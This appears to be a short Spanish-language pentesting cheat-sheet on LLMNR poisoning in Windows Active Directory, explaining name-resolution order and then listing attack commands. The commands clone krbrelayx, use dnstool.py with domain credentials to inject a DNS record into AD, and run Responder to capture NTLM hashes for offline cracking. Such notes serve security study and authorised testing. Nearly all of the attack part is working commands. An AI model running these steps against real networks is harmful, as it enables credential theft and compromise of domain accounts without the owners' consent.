# Ataque LLMNR

Tags: #AD #Windows 

```bash 
# Funcionamiento de Windows 
Pasos: 
1. Consultar el archivo hosts 'C:\Windows\System32\drivers\etc\hosts'
2. Consultar el DNS
3. Windows lanza una petición multicast y uno como atacante impersona al server con la tool 'Responder' 

Notas:
	1. Al momento de la autenticación, Windows comparte el usuario y las password en formato hash para poder crackear offline 
```

```bash 
❯ git clone https://github.com/dirkjanm/krbrelayx         # Descargar la tool  

# Ingresar un registro dentro del AD 
❯ python3 dnstool.py -u domain.corp\\user -p 'passwd' -r  webprueba.domain.corp -a add -d IP IP_DC  

	# IP = Una IP cualquiera para injectar un registro 
	# IP_DC = Se manda a llamar 
```

```bash 
❯ responder -I eth0                # Iniciar la escucha para capturar la petición NTLM de los hashes
	/usr/share/responder/logs     # Ruta del responder donde guarda los archivos capturados  
```